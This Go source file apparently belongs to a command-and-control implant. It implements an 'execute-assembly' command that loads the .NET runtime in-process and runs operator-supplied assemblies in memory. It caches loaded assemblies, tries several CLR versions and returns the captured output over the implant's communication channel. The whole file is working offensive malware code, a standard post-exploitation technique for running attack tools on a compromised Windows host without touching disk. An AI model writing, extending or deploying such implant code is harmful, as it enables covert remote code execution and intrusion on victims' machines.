//go:build windows
// +build windows

package commands

import (
	"bytes"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
	"implant/core/communication"
	"implant/core/debuglog"
	"log"
	"strings"
	"sync"
	"time"

	"github.com/Ne0nd0g/go-clr"
)

var (
	clrInstance *CLRInstance
	assemblies  []*assembly
	// 阶段三-6：execute-assembly 全局执行互斥（单例 CLR 限制，串行化保证输出完整）
	execAssemblyMu sync.Mutex
)

type assembly struct {
	methodInfo *clr.MethodInfo
	hash       [32]byte
}

type CLRInstance struct {
	runtimeHost *clr.ICORRuntimeHost
	sync.Mutex
}

func init() {
	clrInstance = &CLRInstance{}
	assemblies = make([]*assembly, 0)
}

func (c *CLRInstance) GetRuntimeHost(runtime string, debug bool) *clr.ICORRuntimeHost {
	c.Lock()
	defer c.Unlock()
	if c.runtimeHost == nil {
		if debug {
			log.Printf("Initializing CLR runtime host")
		}
		c.runtimeHost, _ = clr.LoadCLR(runtime)
		err := clr.RedirectStdoutStderr()
		if err != nil {
			if debug {
				log.Printf("could not redirect stdout/stderr: %v\n", err)
			}
		}
	}
	return c.runtimeHost
}

func addAssembly(methodInfo *clr.MethodInfo, data []byte) {
	asmHash := sha256.Sum256(data)
	asm := &assembly{methodInfo: methodInfo, hash: asmHash}
	// 【优化】缓存上限：超过 32 个程序集时丢弃最旧的，防止内存无限增长
	if len(assemblies) >= 32 {
		assemblies = append([]*assembly(nil), assemblies[1:]...)
	}
	assemblies = append(assemblies, asm)
}

func getAssembly(data []byte) *assembly {
	asmHash := sha256.Sum256(data)
	for _, asm := range assemblies {
		if asm.hash == asmHash {
			return asm
		}
	}
	return nil
}

// detectDotNetVersion 尝试从 PE 文件中检测 .NET 目标版本
func detectDotNetVersion(data []byte) string {
	if len(data) < 1024 {
		return "unknown"
	}

	// 检查 PE 头
	if data[0] != 0x4D || data[1] != 0x5A {
		return "unknown"
	}

	// 获取 PE 头偏移
	peHeaderOffset := binary.LittleEndian.Uint32(data[60:64])
	if uint32(len(data)) < peHeaderOffset+256 {
		return "unknown"
	}

	// 检查 PE 签名
	if bytes.Compare(data[peHeaderOffset:peHeaderOffset+4], []byte{'P', 'E', 0, 0}) != 0 {
		return "unknown"
	}

	// 获取 Optional Header 中的 CLR Runtime Header
	// 这个简化的检测方法可以帮助我们做初步判断

	// 【优化】CLR 版本字符串位于 PE 元数据附近，只扫描前 512KB，
	// 避免对大程序集做多次全量 strings.Contains（CPU 浪费）
	scanLen := len(data)
	if scanLen > 512*1024 {
		scanLen = 512 * 1024
	}
	content := string(data[:scanLen])
	if strings.Contains(content, "v4.0.30319") {
		return "v4.0"
	}
	if strings.Contains(content, "v4.5") {
		return "v4.5"
	}
	if strings.Contains(content, "v4.6") {
		return "v4.6"
	}
	if strings.Contains(content, "v4.7") {
		return "v4.7"
	}
	if strings.Contains(content, "v4.8") {
		return "v4.8"
	}
	if strings.Contains(content, "v2.0.50727") {
		return "v2.0"
	}

	// 如果找不到特定版本，检查是否包含 .NET 4.x 相关内容
	if strings.Contains(content, "mscorlib") && strings.Contains(content, "System") {
		// 可能是 .NET 4.x，默认为 4.0
		return "v4.0"
	}

	return "unknown"
}

// getOptimalCLRVersions 根据检测到的版本返回优化的 CLR 版本尝试顺序
func getOptimalCLRVersions(detectedVersion string) []string {
	switch detectedVersion {
	case "v4.0":
		// 对于 v4.0 编译的程序集，优先尝试低版本 CLR
		return []string{"v4.0", "v4.5", "v4.6", "v4.7", "v4.8"}
	case "v4.5":
		return []string{"v4.5", "v4.6", "v4.7", "v4.8", "v4.0"}
	case "v4.6":
		return []string{"v4.6", "v4.7", "v4.8", "v4.5", "v4.0"}
	case "v4.7":
		return []string{"v4.7", "v4.8", "v4.6", "v4.5", "v4.0"}
	case "v4.8":
		return []string{"v4.8", "v4.7", "v4.6", "v4.5", "v4.0"}
	case "v2.0":
		return []string{"v2.0", "v4.0", "v4.5", "v4.6", "v4.7", "v4.8"}
	default:
		// 未知版本，使用保守的顺序，从较新版本开始
		return []string{"v4.0", "v4.5", "v4.6", "v4.7", "v4.8", "v2.0"}
	}
}

func LoadBin(data []byte, assemblyArgs []string, runtime string, debug bool) (string, error) {
	// 【阶段三-6】全局互斥：go-clr 为单例 CLR host + 进程级 stdout 重定向，
	// 并发执行会互相污染句柄/管道导致输出丢失。串行化保证每次执行输出完整捕获。
	execAssemblyMu.Lock()
	defer execAssemblyMu.Unlock()

	// 无论成功失败，调用结束后恢复进程级 STDOUT/STDERR 句柄，
	// 避免 go-clr 的 RedirectStdoutStderr 永久污染导致后续子进程/ConPTY 交互终端异常。
	// （go-clr 说明：已实例化的 CLR 会继续向重定向管道写入，输出捕获不受影响。）
	defer clr.RestoreStdoutStderr()

	var (
		methodInfo *clr.MethodInfo
		err        error
	)

	// 验证程序集数据有效性
	if len(data) < 64 {
		return "", errors.New("Invalid assembly data: too small")
	}

	// 检查PE头和.NET标识
	if data[0] != 0x4D || data[1] != 0x5A {
		return "", errors.New("Invalid assembly data: not a valid PE file")
	}

	rtHost := clrInstance.GetRuntimeHost(runtime, debug)
	if rtHost == nil {
		time.Sleep(time.Second)
		rtHost = clrInstance.GetRuntimeHost(runtime, debug)
		if rtHost == nil {
			return "", errors.New("Could not load CLR runtime host")
		}
	}

	if asm := getAssembly(data); asm != nil {
		methodInfo = asm.methodInfo
		if debug {
			log.Printf("Using cached assembly")
		}
	} else {
		if debug {
			log.Printf("Loading new assembly, size: %d bytes", len(data))
		}
		methodInfo, err = clr.LoadAssembly(rtHost, data)
		if err != nil {
			if debug {
				log.Printf("Assembly load failed: %v", err)
			}
			// 提供更详细的错误信息
			errorMsg := fmt.Sprintf("Failed to load .NET assembly: %v\n", err)
			errorMsg += "Possible causes:\n"
			errorMsg += "1. Assembly requires higher privileges\n"
			errorMsg += "2. CLR version incompatibility\n"
			errorMsg += "3. Missing dependencies\n"
			errorMsg += "4. Assembly corruption\n"
			return errorMsg, err
		}
		addAssembly(methodInfo, data)
		if debug {
			log.Printf("Assembly loaded successfully")
		}
	}

	if len(assemblyArgs) == 1 && assemblyArgs[0] == "" {
		// for methods like Main(String[] args), if we pass an empty string slice
		// the clr loader will not pass the argument and look for a method with
		// no arguments, which won't work
		assemblyArgs = []string{" "}
	}

	if debug {
		log.Printf("Assembly loaded, methodInfo: %+v", methodInfo)
		log.Printf("Calling assembly with args: %+v", assemblyArgs)
	}

	// 安全地调用程序集，使用defer确保异常恢复
	var stdout, stderr string
	var invokeErr error

	func() {
		defer func() {
			if r := recover(); r != nil {
				if debug {
					log.Printf("Assembly invocation panic recovered: %v", r)
				}
				// 将panic转换为错误，但不中断执行
				stderr += fmt.Sprintf("\n[Warning] CLR cleanup error: %v", r)
			}
		}()

		stdout, stderr = clr.InvokeAssembly(methodInfo, assemblyArgs)
	}()

	if debug {
		log.Printf("Assembly execution completed")
		log.Printf("Stdout length: %d, Stderr length: %d", len(stdout), len(stderr))
	}

	// 合并输出并返回
	output := strings.TrimSpace(stdout)
	if stderr != "" {
		// 过滤掉CLR清理相关的错误信息，这些不影响实际功能
		cleanStderr := strings.TrimSpace(stderr)
		if !strings.Contains(cleanStderr, "The handle is invalid") &&
			!strings.Contains(cleanStderr, "MethodInfo:Invoke") &&
			!strings.Contains(cleanStderr, "method returned an error") {
			if output != "" {
				output += "\n" + cleanStderr
			} else {
				output = cleanStderr
			}
		} else if debug {
			log.Printf("Filtered CLR cleanup warning: %s", cleanStderr)
		}
	}

	if output == "" {
		output = "[*] Assembly executed successfully (no output generated)"
	}

	return output, invokeErr
}

func ExecuteAssembly(sh []byte, arguments string) ([]byte, error) {
	// 立即发送开始执行信息
	communication.DataProcess(0, []byte("[*] Starting .NET Assembly execution..."))
	communication.DataProcess(0, []byte(fmt.Sprintf("[*] Assembly size: %d bytes", len(sh))))
	communication.DataProcess(0, []byte(fmt.Sprintf("[*] Arguments: %s", arguments)))

	// 采用Rshell的简洁有效实现方式
	go func() {
		debug := true
		params := strings.Split(arguments, " ")

		// 尝试检测程序集的目标.NET版本
		detectedVersion := detectDotNetVersion(sh)
		communication.DataProcess(0, []byte(fmt.Sprintf("[*] Detected target .NET version: %s", detectedVersion)))

		// 根据检测到的版本调整CLR版本尝试顺序
		clrVersions := getOptimalCLRVersions(detectedVersion)
		communication.DataProcess(0, []byte(fmt.Sprintf("[*] CLR version order: %v", clrVersions)))

		var lastError error
		var stdout string

		for _, version := range clrVersions {
			communication.DataProcess(0, []byte(fmt.Sprintf("[*] Trying CLR version %s...", version)))
			stdout, lastError = LoadBin(sh, params, version, debug)
			if lastError == nil {
				communication.DataProcess(0, []byte(fmt.Sprintf("[+] Successfully loaded with CLR %s", version)))
				break
			} else {
				communication.DataProcess(0, []byte(fmt.Sprintf("[!] CLR %s failed: %v", version, lastError)))
			}
		}

		if lastError != nil {
			debuglog.Printf("[DEBUG] All CLR versions failed. Last output: \n%s\n", stdout)
			communication.ErrorProcess(errors.New("All CLR versions failed: " + lastError.Error()))
			if stdout != "" {
				communication.DataProcess(0, []byte("[*] Partial output:"))
				communication.DataProcess(0, []byte(stdout))
			}
			return
		}

		// 成功执行，发送输出
		communication.DataProcess(0, []byte("[+] Assembly execution completed successfully"))
		communication.DataProcess(0, []byte(stdout))
	}()

	return []byte("[*] Executing..."), nil
}
